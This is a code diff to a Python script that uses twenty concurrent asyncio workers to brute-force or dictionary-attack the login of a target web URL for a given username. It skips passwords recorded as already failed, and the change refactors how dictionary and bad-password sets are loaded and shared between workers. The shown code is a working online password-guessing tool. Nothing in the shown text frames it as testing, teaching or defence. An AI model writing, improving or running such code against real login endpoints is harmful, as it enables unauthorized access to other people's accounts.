@@ -20,10 +20,16 @@ namespace = parser.parse_args(sys.argv[1:])
 bad_pass_lock = asyncio.Lock()
 dict_lock = asyncio.Lock()
 
-bad_passwords = set()
 
 found = False 
 found_password = ""
+
+
+def get_passwords(path):
+    if not os.path.exists(path):
+        return set()
+    with open(path) as bad_pass_file:
+        return set(map(lambda l: l.replace("\n",""), bad_pass_file.readlines()))
 
 def generate_password():
     while True: 
@@ -31,11 +37,8 @@ def generate_password():
         if attempt not in bad_passwords:
             return attempt 
 
-def get_bad_passwords():
-    if not os.path.exists(BAD_PASS_FILEPATH):
-        return set()
-    with open(BAD_PASS_FILEPATH) as bad_pass_file:
-        return set(map(lambda l: l.replace("\n",""), bad_pass_file.readlines()))
+
+bad_passwords = get_passwords(BAD_PASS_FILEPATH)
 
 async def send_login_attempt(url, username, password):
     async with aiohttp.ClientSession() as session:
@@ -57,17 +60,13 @@ async def send_login_attempt(url, username, password):
                         bad_pass_file.write(password+"\n")
                 
 
-async def get_password(file_handle):
-    async with dict_lock:
-        return file_handle.readline().replace("\n", "")
 
 
-async def dict_worker( username, url, file_handle):
-    password = await get_password(file_handle) 
-    while password and not found:
+async def dict_worker( username, url, passwords):
+    while passwords and not found:
 
+        password = passwords.pop()
         await send_login_attempt(url, username, password)
-        password = await get_password(file_handle)
 
 async def brute_force_worker(username,url):
     password =  generate_password();
@@ -87,9 +86,9 @@ async def check_status():
 async def main():
     asyncio.create_task(check_status())
     if namespace.dictfile:
-        with  open(namespace.dictfile) as dictfile:
-            workers = [dict_worker( namespace.target, namespace.url, dictfile) for i in range(20)]
-            await asyncio.gather(*workers)
+        passwords = get_passwords(namespace.dictfile).difference(bad_passwords)
+        workers = [dict_worker( namespace.target, namespace.url, passwords) for i in range(20)]
+        await asyncio.gather(*workers)
     else:
         workers = [brute_force_worker(namespace.target, namespace.url) for i in range(20)]
         await asyncio.gather(*workers)
